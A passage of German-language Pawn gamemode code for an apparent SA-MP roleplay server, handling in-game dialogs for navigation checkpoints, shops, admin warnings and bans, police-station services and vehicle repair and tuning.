		        ShowPlayerDialog(playerid,DIALOG_MC1,DIALOG_STYLE_LIST,"Medic/Skin Wahl/Dienst","{FEFEFE}Im Dienst: {00A614}Ja{FEFEFE}\nSkin Wählen","Auswählen","Beenden");
		    }
	    }
	}
	else if(dialogid == DIALOG_DRUUG)
	{
	    if(response)
	    {
	        if(listitem == 0)
	        {
	            if(SpielerInfo[playerid][uGeld] < 3) return SendClientMessage(playerid,COLOR_RED,"Du hast nicht genug Geld!");
	            GebeGeld(playerid,-3);
	            SendClientMessage(playerid,COLOR_BOT,"Jonny: Hier dein HotDog.");
	            Verstauen(playerid,19346,1);
	        }
	        if(listitem == 1)
	        {
	            if(SpielerInfo[playerid][uGeld] < 28) return SendClientMessage(playerid,COLOR_RED,"Du hast nicht genug Geld!");
	            if(!Verstauen(playerid,16304,1)) return SendClientMessage(playerid,COLOR_RED,"Inventar voll!");
				GebeGeld(playerid,-28);
	            SendClientMessage(playerid,COLOR_BOT,"Jonny: Jetzt zieh schnell Leine ...");
	        }
	    }
	    else{SendClientMessage(playerid,COLOR_BOT,"Jonny: Bis dann..");}
	}
	else if(dialogid == DIALOG_NAVI1)
	{
	    if(response)
	    {
	        if(listitem == 0)
	        {
	            ShowPlayerDialog(playerid,DIALOG_NAVI2,DIALOG_STYLE_LIST,"Lake Sorten","Stadthalle/Arbeitsamt/Motel\nPolice Department\nSupermarkt 24/7\nBus & Müllfahrzeuge (Job)\nKrankenhaus\nSkinshop\nFire Department\nAutohaus\nBSN\nParkhaus","Setzen","Zurück");
			}
			if(listitem == 1)
			{
                ShowPlayerDialog(playerid,DIALOG_NAVI3,DIALOG_STYLE_LIST,"Santa Felton","Stadthalle/Motel/Arbeitsamt\nPolice Department\nAutohaus\nPaint and Spray\nMedic Department\nBank\nBus & Müllfahrzeuge (Job)\nSchrottplatz\nFraktionsautohaus\nPizza Italia\nFischmarkt","Setzen","Zurück");
            }
			if(listitem == 2)
			{
                ShowPlayerDialog(playerid,DIALOG_NAVI4,DIALOG_STYLE_LIST,"Lake Vortex","Fire Department\n24/7 Shop","Setzen","Zurück");
            }
			if(listitem == 3)
			{
                 SetPlayerCheckpoint(playerid, 4337.7896,-7708.4702,4.2152, 3.0);
                 cpaktiv[playerid] = 1;
                 SendClientMessage(playerid,COLOR_BLUE,"Checkpoint gesetzt nach Portland. Meldung: Gefahren durch Gangmitglieder.");
            }
			if(listitem == 4)
			{
				SetPlayerCheckpoint(playerid, 1773.3994,-7526.0947,4.2232, 3.0);
    			cpaktiv[playerid] = 1;
       			SendClientMessage(playerid,COLOR_BLUE,"Checkpoint gesetzt nach Villbeach.");
			}
			if(listitem == 5)
			{
			    ShowPlayerDialog(playerid,DIALOG_NAVI5,DIALOG_STYLE_LIST,"Jobs außerhalb der Städte","Farm nahe LS\nFarm nahe SF/LV\nTrucker Terminal\nHolzfäller\nBusfahrer LS\nBusfahrer SF\nMüllabfuhr LS\nMüllabfuhr SF\nHolzfäller Abgabestelle\nWeitere Jobstellen?","Setzen","Zurück");
			}
			if(listitem == 6)
			{
			    SetPlayerCheckpoint(playerid, 1598.6658,-8498.5117,2.3310, 3.0);
       			cpaktiv[playerid] = 1;
          		SendClientMessage(playerid,COLOR_BLUE,"Checkpoint gesetzt zum Tailcenter: Fahrschule, Waffenladen, Bank & Disco.");
			}
			if(listitem == 7)
			{
			    SetPlayerCheckpoint(playerid, 4183.2197,-8552.5449,4.2197, 3.0);
       			cpaktiv[playerid] = 1;
          		SendClientMessage(playerid,COLOR_BLUE,"Checkpoint gesetzt zum Wrong Hill. Schwarzmarkt muss aufgesucht werden.");
			}
			if(listitem == 8)
			{
			    ShowPlayerDialog(playerid,DIALOG_NAVIG,DIALOG_STYLE_LIST,"Gangwarzonen","Santa Felton Holzsteg\nSanta Felton Schrottplatz\nPortland\nKreuzung Wrong Hill - LS - LV\nLake Sorten Park","Setzen","Zurück");
			}
			if(listitem == 9)
			{
			    ShowPlayerDialog(playerid,DIALOG_NAVIF,DIALOG_STYLE_LIST,"Fraktionsbases","Lake Sorten Police Department\nSanta Felton Police Department\nSanta Felton Fire & Rescue\nLake Sorten Fire & Rescue\nBallas\nGrove Street\nAztecas\nLa Cosa Nostra\nYakuza\nU.S. Army\nVagos\nMayans MC","Setzen","Zurück");
			}
		}
	}
	else if(dialogid == DIALOG_NAVIF)
	{
		if(response)
	    {
	        if(listitem == 0)
	        {
	            SetPlayerCheckpoint(playerid,1582.8428,-9531.6152,6.3945-1, 3.0);cpaktiv[playerid] = 1;
	            SendClientMessage(playerid,COLOR_RED,"Checkpoint gesetzt! Fahre zum roten Punkt auf der Karte");
			}
			if(listitem == 1)
	        {
	            SetPlayerCheckpoint(playerid,6478.5972,-7868.3604,4.2163-1, 3.0);cpaktiv[playerid] = 1;
	            SendClientMessage(playerid,COLOR_RED,"Checkpoint gesetzt! Fahre zum roten Punkt auf der Karte");
			}
			if(listitem == 2)
	        {
	            SetPlayerCheckpoint(playerid,6460.7441,-7717.7290,4.2186-1, 3.0);cpaktiv[playerid] = 1;
	            SendClientMessage(playerid,COLOR_RED,"Checkpoint gesetzt! Fahre zum roten Punkt auf der Karte");
			}
			if(listitem == 3)
	        {
	            SetPlayerCheckpoint(playerid,1786.6766,-9305.7324,4.2192-1, 3.0);cpaktiv[playerid] = 1;
	            SendClientMessage(playerid,COLOR_RED,"Checkpoint gesetzt! Fahre zum roten Punkt auf der Karte");
			}
			if(listitem == 4)
	        {
	            SetPlayerCheckpoint(playerid,1708.9340,-8818.4844,4.2212-1, 3.0);cpaktiv[playerid] = 1;
	            SendClientMessage(playerid,COLOR_RED,"Checkpoint gesetzt! Fahre zum roten Punkt auf der Karte");
			}
			if(listitem == 5)
	        {
	            SetPlayerCheckpoint(playerid,4352.2100,-7624.2905,4.2172-1, 3.0);cpaktiv[playerid] = 1;
	            SendClientMessage(playerid,COLOR_RED,"Checkpoint gesetzt! Fahre zum roten Punkt auf der Karte");
			}
			if(listitem == 6)
	        {
	            SetPlayerCheckpoint(playerid,4182.7354,-7623.1963,4.2172-1, 3.0);cpaktiv[playerid] = 1;
	            SendClientMessage(playerid,COLOR_RED,"Checkpoint gesetzt! Fahre zum roten Punkt auf der Karte");
			}
			if(listitem == 7)
	        {
	            SetPlayerCheckpoint(playerid,6360.6099,-9304.1650,4.2166-1, 3.0);cpaktiv[playerid] = 1;
	            SendClientMessage(playerid,COLOR_RED,"Checkpoint gesetzt! Fahre zum roten Punkt auf der Karte");
			}
			if(listitem == 8)
	        {
	            SetPlayerCheckpoint(playerid,3171.9741,-9295.6650,4.2172-1, 3.0);cpaktiv[playerid] = 1;
	            SendClientMessage(playerid,COLOR_RED,"Checkpoint gesetzt! Fahre zum roten Punkt auf der Karte");
			}
			if(listitem == 9)
	        {
	            SetPlayerCheckpoint(playerid,4339.1084,-8550.4209,4.2130-1, 3.0);cpaktiv[playerid] = 1;
	            SendClientMessage(playerid,COLOR_RED,"Checkpoint gesetzt! Fahre zum roten Punkt auf der Karte");
			}
			if(listitem == 10)
	        {
	            SetPlayerCheckpoint(playerid,6335.8730,-9136.2158,4.2166-1, 3.0);cpaktiv[playerid] = 1;
	            SendClientMessage(playerid,COLOR_RED,"Checkpoint gesetzt! Fahre zum roten Punkt auf der Karte");
			}
			if(listitem == 11)
	        {
	            SetPlayerCheckpoint(playerid,3724.3835,-9303.0313,4.2172-1, 3.0);cpaktiv[playerid] = 1;
	            SendClientMessage(playerid,COLOR_RED,"Checkpoint gesetzt! Fahre zum roten Punkt auf der Karte");
			}
		}
		else
		{
		    ShowPlayerDialog(playerid, DIALOG_NAVI1, DIALOG_STYLE_LIST, "Navigation", "Lake Sorten\nSanta Felton\nLake Vortex\nPortland\nVillbeach\nJobs\nTailcenter: Fahrschule, Waffenladen, Bank\nWrong Hill (Nähe Schwarzmarkt)\nGangwarzonen\nFraktionsbases", "Weiter", "Abbrechen");
		}
	}
	else if(dialogid == DIALOG_NAVIG)
	{
		if(response)
	    {
	        if(listitem == 0)
	        {
	            SetPlayerCheckpoint(playerid,6342.7451,-8142.0068,4.4018-1, 3.0);cpaktiv[playerid] = 1;
	            SendClientMessage(playerid,COLOR_RED,"Checkpoint gesetzt! Fahre zum roten Punkt auf der Karte");
			}
			if(listitem == 1)
	        {
	            SetPlayerCheckpoint(playerid,6602.9102,-7750.4756,4.4136-1, 3.0);cpaktiv[playerid] = 1;
	            SendClientMessage(playerid,COLOR_RED,"Checkpoint gesetzt! Fahre zum roten Punkt auf der Karte");
			}
			if(listitem == 2)
	        {
	            SetPlayerCheckpoint(playerid,4311.3105,-7695.5996,4.2152-1, 3.0);cpaktiv[playerid] = 1;
	            SendClientMessage(playerid,COLOR_RED,"Checkpoint gesetzt! Fahre zum roten Punkt auf der Karte");
			}
			if(listitem == 3)
	        {
	            SetPlayerCheckpoint(playerid,4331.9795,-9292.6445,4.2172-1, 3.0);cpaktiv[playerid] = 1;
	            SendClientMessage(playerid,COLOR_RED,"Checkpoint gesetzt! Fahre zum roten Punkt auf der Karte");
			}
			if(listitem == 4)
	        {
	            SetPlayerCheckpoint(playerid,1692.5686,-9163.2295,4.2172-1, 3.0);cpaktiv[playerid] = 1;
	            SendClientMessage(playerid,COLOR_RED,"Checkpoint gesetzt! Fahre zum roten Punkt auf der Karte");
			}
		}
		else
		{
		    ShowPlayerDialog(playerid, DIALOG_NAVI1, DIALOG_STYLE_LIST, "Navigation", "Lake Sorten\nSanta Felton\nLake Vortex\nPortland\nVillbeach\nJobs\nTailcenter: Fahrschule, Waffenladen, Bank\nWrong Hill (Nähe Schwarzmarkt)\nGangwarzonen\nFraktionsbases", "Weiter", "Abbrechen");
		}
	}
	else if(dialogid == DIALOG_NAVI4)
	{
		if(response)
	    {
	        if(listitem == 0)
	        {
	            SetPlayerCheckpoint(playerid,6324.8384,-9352.6143,4.4041, 3.0);cpaktiv[playerid] = 1;
	            SendClientMessage(playerid,COLOR_RED,"Checkpoint gesetzt! Fahre zum roten Punkt auf der Karte");
			}
			if(listitem == 1)
	        {
	            SetPlayerCheckpoint(playerid,6419.4897,-9153.4775,4.2146, 3.0);cpaktiv[playerid] = 1;
	            SendClientMessage(playerid,COLOR_RED,"Checkpoint gesetzt! Fahre zum roten Punkt auf der Karte");
			}
		}
		else
		{
		    ShowPlayerDialog(playerid, DIALOG_NAVI1, DIALOG_STYLE_LIST, "Navigation", "Lake Sorten\nSanta Felton\nLake Vortex\nPortland\nVillbeach\nJobs\nTailcenter: Fahrschule, Waffenladen, Bank\nWrong Hill (Nähe Schwarzmarkt)\nGangwarzonen\nFraktionsbases", "Weiter", "Abbrechen");
		}
	}
	else if(dialogid == DIALOG_NAVI5)
	{
		if(response)
	    {
	        if(listitem == 0)
	        {
	            SetPlayerCheckpoint(playerid,4551.4614,-9307.1816,4.4076, 3.0);cpaktiv[playerid] = 1;
	            SendClientMessage(playerid,COLOR_RED,"Checkpoint nach Farm nahe LS gesetzt!");
			}
			if(listitem == 1)
			{
			    SetPlayerCheckpoint(playerid,5775.6831,-9291.3066,4.4153, 3.0);cpaktiv[playerid] = 1;
	            SendClientMessage(playerid,COLOR_RED,"Checkpoint nach Farm nahe SF/LV gesetzt!");
    		}
    		if(listitem == 2)
			{
			    SetPlayerCheckpoint(playerid,4092.1382,-9285.9570,4.5063, 3.0);cpaktiv[playerid] = 1;
	            SendClientMessage(playerid,COLOR_RED,"Checkpoint zum Trucker Depot gesetzt!");
    		}
    		if(listitem == 3)
			{
			    SetPlayerCheckpoint(playerid,4322.8286,-8665.4336,4.3929, 3.0);cpaktiv[playerid] = 1;
	            SendClientMessage(playerid,COLOR_RED,"Checkpoint zum Holzfäller!");
    		}
    		if(listitem == 4)
			{
	            SetPlayerCheckpoint(playerid,1674.0433,-9281.3232,4.4024, 3.0);cpaktiv[playerid] = 1;
	            SendClientMessage(playerid,COLOR_RED,"Checkpoint zum Busfahrer LS!");
    		}
    		if(listitem == 5)
			{
	            SetPlayerCheckpoint(playerid,6623.2070,-7803.1406,4.4096, 3.0);cpaktiv[playerid] = 1;
	            SendClientMessage(playerid,COLOR_RED,"Checkpoint zum Busfahrer SF!");
    		}
    		if(listitem == 6)
			{
	            SetPlayerCheckpoint(playerid,1677.6519,-9259.6436,4.4024, 3.0);cpaktiv[playerid] = 1;
	            SendClientMessage(playerid,COLOR_RED,"Checkpoint zur Müllabfuhr LS!");
    		}
    		if(listitem == 7)
			{
	            SetPlayerCheckpoint(playerid,6627.6602,-7736.2783,4.4076, 3.0);cpaktiv[playerid] = 1;
	            SendClientMessage(playerid,COLOR_RED,"Checkpoint zur Müllabfuhr SF!");
    		}
    		if(listitem == 8)
			{
	            SetPlayerCheckpoint(playerid,3046.7622,-8526.3115,4.3970-1, 3.0);cpaktiv[playerid] = 1;
	            SendClientMessage(playerid,COLOR_RED,"Checkpoint zur Holzabgabestelle!");
    		}
    		if(listitem == 9)
			{
	            SendClientMessage(playerid,COLOR_BLUE,"Nutze /navi und suche in der Stadt in der Du dich befindest.");
    		}
		}
		else
		{
		    ShowPlayerDialog(playerid, DIALOG_NAVI1, DIALOG_STYLE_LIST, "Navigation", "Lake Sorten\nSanta Felton\nLake Vortex\nPortland\nVillbeach\nJobs\nTailcenter: Fahrschule, Waffenladen, Bank\nWrong Hill (Nähe Schwarzmarkt)\nGangwarzonen\nFraktionsbases", "Weiter", "Abbrechen");
		}
	}
	else if(dialogid == DIALOG_NAVI3)
	{
		if(response)
	    {
	        if(listitem == 0)
	        {
	            SetPlayerCheckpoint(playerid,6372.6709,-7755.5532,4.4102, 3.0);cpaktiv[playerid] = 1;
	            SendClientMessage(playerid,COLOR_RED,"Checkpoint gesetzt! Fahre zum roten Punkt auf der Karte");
			}
			if(listitem == 1)
			{
			    SetPlayerCheckpoint(playerid,6486.0962,-7872.1523,4.4102, 3.0);cpaktiv[playerid] = 1;
	            SendClientMessage(playerid,COLOR_RED,"Checkpoint gesetzt! Fahre zum roten Punkt auf der Karte");
    		}
    		if(listitem == 2)
			{
			    SetPlayerCheckpoint(playerid,6544.8022,-7834.4971,4.4102, 3.0);cpaktiv[playerid] = 1;
	            SendClientMessage(playerid,COLOR_RED,"Checkpoint gesetzt! Fahre zum roten Punkt auf der Karte");
    		}
    		if(listitem == 3)
			{
			    SetPlayerCheckpoint(playerid,6428.8823,-7834.7466,4.4102, 3.0);cpaktiv[playerid] = 1;
	            SendClientMessage(playerid,COLOR_RED,"Checkpoint gesetzt! Fahre zum roten Punkt auf der Karte");
    		}
    		if(listitem == 4)
			{
			    SetPlayerCheckpoint(playerid,6444.0000,-7731.8843,4.4102, 3.0);cpaktiv[playerid] = 1;
	            SendClientMessage(playerid,COLOR_RED,"Checkpoint gesetzt! Fahre zum roten Punkt auf der Karte");
    		}
    		if(listitem == 5)
			{
			    SetPlayerCheckpoint(playerid,6417.8765,-7724.2378,4.4102, 3.0);cpaktiv[playerid] = 1;
           		SendClientMessage(playerid,COLOR_RED,"Checkpoint gesetzt! Fahre zum roten Punkt auf der Karte");
			}
			if(listitem == 6)
			{
			    SetPlayerCheckpoint(playerid,6651.8726,-7767.9980,4.4095, 3.0);cpaktiv[playerid] = 1;
           		SendClientMessage(playerid,COLOR_RED,"Checkpoint gesetzt! Fahre zum roten Punkt auf der Karte");
			}
			if(listitem == 7)
			{
			    SetPlayerCheckpoint(playerid,6533.7866,-7745.7090,4.4254, 3.0);cpaktiv[playerid] = 1;
           		SendClientMessage(playerid,COLOR_RED,"Checkpoint gesetzt! Fahre zum roten Punkt auf der Karte");
			}
			if(listitem == 8)
			{
			    SetPlayerCheckpoint(playerid,6572.6450,-7801.2988,4.4096, 3.0);cpaktiv[playerid] = 1;
           		SendClientMessage(playerid,COLOR_RED,"Checkpoint gesetzt! Fahre zum roten Punkt auf der Karte");
			}
			if(listitem == 9)
			{
			    SetPlayerCheckpoint(playerid,6592.3667,-7880.0537,4.4086, 3.0);cpaktiv[playerid] = 1;
           		SendClientMessage(playerid,COLOR_RED,"Checkpoint gesetzt! Fahre zum roten Punkt auf der Karte");
			}
			if(listitem == 10)
			{
			    SetPlayerCheckpoint(playerid,6451.4619,-8141.5786,4.4018, 3.0);cpaktiv[playerid] = 1;
           		SendClientMessage(playerid,COLOR_RED,"Checkpoint gesetzt! Fahre zum roten Punkt auf der Karte");
			}
		}
		else
		{
		    ShowPlayerDialog(playerid, DIALOG_NAVI1, DIALOG_STYLE_LIST, "Navigation", "Lake Sorten\nSanta Felton\nLake Vortex\nPortland\nVillbeach\nJobs\nTailcenter: Fahrschule, Waffenladen, Bank\nWrong Hill (Nähe Schwarzmarkt)\nGangwarzonen\nFraktionsbases", "Weiter", "Abbrechen");
		}
	}
	else if(dialogid == DIALOG_NAVI2)
	{
		if(response)
	    {
	        if(listitem == 0)
	        {
	            SetPlayerCheckpoint(playerid, 1832.0771,-9282.5420,4.4102, 3.0);
	            cpaktiv[playerid] = 1;
	            SendClientMessage(playerid,COLOR_RED,"Checkpoint gesetzt! Fahre zum roten Punkt auf der Karte");
			}
			if(listitem == 1)
	        {
	            SetPlayerCheckpoint(playerid, 1575.1865,-9534.8320,6.6481, 3.0);
	            cpaktiv[playerid] = 1;
	            SendClientMessage(playerid,COLOR_RED,"Checkpoint gesetzt! Fahre zum roten Punkt auf der Karte");
			}
			if(listitem == 2)
	        {
	            SetPlayerCheckpoint(playerid, 1606.5518,-9328.1641,6.6481, 3.0);
	            cpaktiv[playerid] = 1;
	            SendClientMessage(playerid,COLOR_RED,"Checkpoint gesetzt! Fahre zum roten Punkt auf der Karte");
			}
			if(listitem == 3)
	        {
	            SetPlayerCheckpoint(playerid, 1680.9132,-9277.7793,4.4102, 3.0);cpaktiv[playerid] = 1;
	            SendClientMessage(playerid,COLOR_RED,"Checkpoint gesetzt! Fahre zum roten Punkt auf der Karte");
			}
			if(listitem == 4)
	        {
	            SetPlayerCheckpoint(playerid, 1753.0680,-9309.8828,4.4102, 3.0);cpaktiv[playerid] = 1;
	            SendClientMessage(playerid,COLOR_RED,"Checkpoint gesetzt! Fahre zum roten Punkt auf der Karte");
			}
			if(listitem == 5)
	        {
	            SetPlayerCheckpoint(playerid,1782.5029,-9314.2148,4.4102, 3.0);cpaktiv[playerid] = 1;
	            SendClientMessage(playerid,COLOR_RED,"Checkpoint gesetzt! Fahre zum roten Punkt auf der Karte");
			}
			if(listitem == 6)
	        {
	            SetPlayerCheckpoint(playerid, 1780.7058,-9331.7539,4.4102, 3.0);cpaktiv[playerid] = 1;
	            SendClientMessage(playerid,COLOR_RED,"Checkpoint gesetzt! Fahre zum roten Punkt auf der Karte");
			}
			if(listitem == 7)
	        {
	            SetPlayerCheckpoint(playerid, 1741.3286,-9283.1152,4.4102, 3.0);cpaktiv[playerid] = 1;
	            SendClientMessage(playerid,COLOR_RED,"Checkpoint gesetzt! Fahre zum roten Punkt auf der Karte");
			}
			if(listitem == 8)
	        {
	            SetPlayerCheckpoint(playerid, 1751.3082,-9190.6367,4.4102, 3.0);cpaktiv[playerid] = 1;
	            SendClientMessage(playerid,COLOR_RED,"Checkpoint gesetzt! Fahre zum roten Punkt auf der Karte");
			}
			if(listitem == 9)
	        {
	            SetPlayerCheckpoint(playerid, 1780.3387,-8899.9092,4.4102, 3.0);cpaktiv[playerid] = 1;
	            SendClientMessage(playerid,COLOR_RED,"Checkpoint gesetzt! Fahre zum roten Punkt auf der Karte");
			}
		}
		else
		{
		    ShowPlayerDialog(playerid, DIALOG_NAVI1, DIALOG_STYLE_LIST, "Navigation", "Lake Sorten\nSanta Felton\nLake Vortex\nPortland\nVillbeach\nJobs\nTailcenter: Fahrschule, Waffenladen, Bank\nWrong Hill (Nähe Schwarzmarkt)\nGangwarzonen\nFraktionsbases", "Weiter", "Abbrechen");
		}
	}

	else if(dialogid == ADMIN_WARN)
	{
	    if(response)
	    {
		    format(string,sizeof string,"Admin %s hat dich verwarnt, Grund: %s",PlayerName(playerid),inputtext);
		    SendClientMessage(ClickedID[playerid],COLOR_LIGHTRED,string);
		    format(string,sizeof string,"Du hast %s verwarnt, Grund: %s",PlayerName(ClickedID[playerid]),inputtext);
		    SendClientMessage(playerid,COLOR_LIGHTRED,string);
		    SpielerInfo[ClickedID[playerid]][uWarns]++;
		    panelfiles(ClickedID[playerid], playerid, 1,inputtext);
		    if(SpielerInfo[ClickedID[playerid]][uWarns] == 3)
		    {
		        SendClientMessage(ClickedID[playerid],COLOR_RED,"Du wurdest gebannt, Grund: 3 Verwarnungen!");
		        format(string,sizeof string,"%s wurde gebannt, Grund: 3 Verwarnungen",PlayerName(ClickedID[playerid]));
		    	SendMessageToAll(COLOR_LIGHTRED,string);
		    	KWBLog(PlayerName(ClickedID[playerid]),"System","Bann","3 Verwarnungen");
		    	SpielerInfo[ClickedID[playerid]][uBan] = 1;
		    	Ban(ClickedID[playerid]);
		    }
		    KWBLog(PlayerName(ClickedID[playerid]),PlayerName(playerid),"Warn",inputtext);
		    AdminPanelAbbrechen(playerid);
	    }
	}
	else if(dialogid == DIALOG_SKINS)
	{
		if(response)
		{
		    if(listitem == 0)
		    {
	    		if(SpielerInfo[playerid][uGeld] < 40) return SendClientMessage(playerid,COLOR_GREEN,"Du brauchst 40$ für einen neuen Skin.");
	  			SpielerInfo[playerid][uZiviSkin] = GetPlayerSkin(playerid);
	  			SpielerInfo[playerid][uZiviFrak] = 0;
				KleidungChoose[playerid] = 1;
				Teleport(playerid,1766.7178,-9324.5498,4.4854);
				SetPlayerCameraPos(playerid,1768.8817,-9321.3135,4.4144);
				SetPlayerCameraLookAt(playerid,1766.2905,-9324.9619,4.4854);
				SetPlayerFacingAngle(playerid,333);
				Freeze(playerid);
				SendClientMessage(playerid,COLOR_GREEN,"Bestätigung des Kaufes 'LEERTASTE' (40$) Abbruch mit 'ENTER'");
		    }
		    if(listitem == 1)
		    {
	    		if(SpielerInfo[playerid][uGeld] < 40) return SendClientMessage(playerid,COLOR_GREEN,"Du brauchst 40$ für einen neuen Skin.");
		        SpielerInfo[playerid][uZiviSkin] = GetPlayerSkin(playerid);
		        SpielerInfo[playerid][uZiviFrak] = 0;
				KleidungChoose[playerid] = -1;
				Teleport(playerid,1766.6106,-9313.9336,4.4854);
				SetPlayerCameraPos(playerid,1769.1708,-9316.8594,4.4164);
				SetPlayerCameraLookAt(playerid,1766.6011,-9313.6074,4.4854);
				SetPlayerFacingAngle(playerid,219);
				Freeze(playerid);
				SendClientMessage(playerid,COLOR_GREEN,"Bestätigung des Kaufes 'LEERTASTE' (40$) Abbruch mit 'ENTER'");
		    }
		}
	}
	else if(dialogid == ADMIN_LEBEN)
	{
	    if(response)
	    {
	    	GebeLeben(ClickedID[playerid], floatstr(inputtext));
	    	AdminPanelAbbrechen(playerid);
    	}
	}
	else if(dialogid == ADMIN_RUESTUNG)
	{
	    if(response)
	    {
	        GebeRuestung(ClickedID[playerid], floatstr(inputtext));
	        AdminPanelAbbrechen(playerid);
     	}
	}
	else if(dialogid == ADMIN_INT)
	{
	    if(response)
	    {
			SetPlayerInterior(ClickedID[playerid], strval(inputtext));
		}
	}
	else if(dialogid == ADMIN_WELT)
	{
	    if(response)
	    {
	   	 	SetPlayerVirtualWorld(ClickedID[playerid], strval(inputtext));
	   	 	AdminPanelAbbrechen(playerid);
  	 	}
	}
	else if(dialogid == ADMIN_SAY)
	{
    	if(response)
	    {
			format(string,sizeof string,"Admin %s flüstert: %s",PlayerName(playerid),inputtext);
			SendClientMessage(ClickedID[playerid],COLOR_YELLOW,string);
			format(string,sizeof string,"Du flüsterst zu %s: %s",PlayerName(ClickedID[playerid]),inputtext);
			SendClientMessage(playerid,COLOR_YELLOW,string);
			AdminPanelAbbrechen(playerid);
		}
	}
	else if(dialogid == DIALOG_PD5)
	{
	    if(response)
	    {
	        if(listitem == 0)
	        {
	            new ppname[MAX_PLAYER_NAME],str[150];
	            GetPlayerName(playerid,ppname,sizeof(ppname));
	            format(str,sizeof(str),"%s betätigt die Klingel und befindet sich in der Eingangshalle.",ppname);
				FraktionsNachricht(2,0xFF8C00FF,str);
				SendClientMessage(playerid,0xFF8C00FF,"Du hast geklingelt. Warte bis ein Officer sich bei dir meldet.");
				//PlayAudioStreamForPlayer(playerid, "https://county-islands.com/sounds/prisondoor.mp3",1557.5604,-9498.5576,7.1537,15.0, 1);
				PlayerPlaySound(playerid,1058,0.0,0.0,0.0);
				for(new i = 0; i < MAX_PLAYERS; i++)
				{
				    if(IsPlayerConnected(i) && !IsPlayerNPC(i) && (IstSpielerInFrak(i,2)))
				    {
				        PlayerPlaySound(i,1058,0.0,0.0,0.0);
				        //PlayAudioStreamForPlayer(playerid, "https://county-islands.com/sounds/klingel.mp3");
				    }
				}
	        }
	        if(listitem == 1)
	        {
	            if(SpielerInfo[playerid][uLevel] >= 2)
	            {
		            if(SpielerInfo[playerid][uWaffenschein] == 0)
		            {
		                if(SpielerInfo[playerid][uGeld] >= 600)
		                {
		                    GebeGeld(playerid,-600);
		                    SendClientMessage(playerid,COLOR_GREEN,"Du hast einen Waffenschein erworben.");
		                    SpielerInfo[playerid][uWaffenschein] = 1;
		                    if(SpielerInfo[playerid][ufWaffenschein] == 0)
		                    {
		                    	SpielerInfo[playerid][ufWaffenschein] = 1;
		                    	Missionenaktu(playerid);
		                    	SendClientMessage(playerid,COLOR_BLUE,"[MISSIONEN]: {FFFFFF}GLÜCKWUNSCH! Du hast folgende Mission abgeschlossen: Waffenschein {0080FF}(/missionen)");
                                new Float:belohnung;
				            	belohnung = 150;
				            	SendFormatMessage(playerid,COLOR_GREEN,"[BELOHNUNG]: {FFFFFF}Für diese Mission bekommst du %.2f{0B610B}$",belohnung);
								GebeGeld(playerid,belohnung);
							}
		                }else{SendClientMessage(playerid,COLOR_RED,"Der Waffenschein kostet 600$. Soviel hast du nicht.");}
		            }else{SendClientMessage(playerid,COLOR_RED,"Du hast bereits einen Waffenschein.");}
				}else{SendClientMessage(playerid,COLOR_RED,"Du musst mindestens Level 2 sein!");}
	        }
	    }
	}
	else if(dialogid == DIALOG_PD4)
	{
	    if(response)
	    {
	        if(listitem == 0)
	        {
	            new ppname[MAX_PLAYER_NAME],str[150];
	            GetPlayerName(playerid,ppname,sizeof(ppname));
	            format(str,sizeof(str),"%s betätigt die Klingel und befindet sich in der Eingangshalle.",ppname);
				FraktionsNachricht(1,0xFF8C00FF,str);
				SendClientMessage(playerid,0xFF8C00FF,"Du hast geklingelt. Warte bis ein Officer sich bei dir meldet.");
				PlayerPlaySound(playerid,1058,0.0,0.0,0.0);
				for(new i = 0; i < MAX_PLAYERS; i++)
				{
				    if(IsPlayerConnected(i) && !IsPlayerNPC(i) && (IstSpielerInFrak(i,1)))
				    {
				        PlayerPlaySound(i,1058,0.0,0.0,0.0);
				    }
				}
	        }
	        if(listitem == 1)
	        {
	            if(SpielerInfo[playerid][uWaffenschein] == 0)
	            {
	                if(SpielerInfo[playerid][uGeld] >= 600)
	                {
	                    GebeGeld(playerid,-600);
	                    SendClientMessage(playerid,COLOR_GREEN,"Du hast einen Waffenschein erworben.");
	                    SpielerInfo[playerid][uWaffenschein] = 1;
	                    if(SpielerInfo[playerid][ufWaffenschein] == 0)
	                    {
	                    	SpielerInfo[playerid][ufWaffenschein] = 1;
	                    	Missionenaktu(playerid);
	                    	SendClientMessage(playerid,COLOR_BLUE,"[MISSIONEN]: {FFFFFF}GLÜCKWUNSCH! Du hast folgende Mission abgeschlossen: Waffenschein {0080FF}(/missionen)");
	                    	new Float:belohnung;
			            	belohnung = 150;
			            	SendFormatMessage(playerid,COLOR_GREEN,"[BELOHNUNG]: {FFFFFF}Für diese Mission bekommst du %.2f{0B610B}$",belohnung);
							GebeGeld(playerid,belohnung);
						}
	                }else{SendClientMessage(playerid,COLOR_RED,"Der Waffenschein kostet 600$. Soviel hast du nicht.");}
	            }else{SendClientMessage(playerid,COLOR_RED,"Du hast bereits einen Waffenschein.");}
	        }
	    }
	}
	else if(dialogid == DIALOG_PNS)
	{
	    if(response == 1)
	    {
	        if(listitem == 0)
	        {
	            new Float:health;
				GetVehicleHealth(GetPlayerVehicleID(playerid),health);
				if(SpielerInfo[playerid][uGeld] < 90)
				{
					 SendClientMessage(playerid,COLOR_RED,"Du hast nicht genug Geld!");
					 ShowPlayerDialog(playerid,DIALOG_PNS,DIALOG_STYLE_LIST,"Was möchtest du machen?","Fahrzeugreperatur\nUmspritzung -250$\nNitro\nHydraulik -140$\nReifen -120$\nSonstiges Tuning je Bauteil 90$","Weiter","Verlassen");
					 return 1;
			 	}
			 	else
			 	{
				    GebeGeld(playerid,-90);
		            Reparieren(GetPlayerVehicleID(playerid));
		            ShowPlayerDialog(playerid,DIALOG_PNS,DIALOG_STYLE_LIST,"Was möchtest du machen?","Fahrzeugreperatur\nUmspritzung -250$\nNitro\nHydraulik -140$\nReifen -120$\nSonstiges Tuning je Bauteil 90$","Weiter","Verlassen");
		            SendClientMessage(playerid,COLOR_GREEN,"Nutze (Leertaste) um zu bestätigen, nutze (Enter) um abzubrechen.");
	            }
	        }
	        else if(listitem == 1)
	        {
	            if(SpielerInfo[playerid][uGeld] < 250) return SendClientMessage(playerid,COLOR_RED,"Du benötigst 250$!");
	            TextDrawShowForPlayer(playerid,Farbtabelle_hintergrund);
				for(new wert = 0; wert < sizeof(Farbtabelle); wert++)
				{
					TextDrawShowForPlayer(playerid,Farbtabelle[wert]);
				}
				Farbtabelle_rahmen[playerid] = CreatePlayerTextDraw(playerid,252.000000, 128.000000, "~n~");
				PlayerTextDrawLetterSize(playerid,Farbtabelle_rahmen[playerid], 0.500000, 1.900000);
				PlayerTextDrawUseBox(playerid,Farbtabelle_rahmen[playerid], 1);
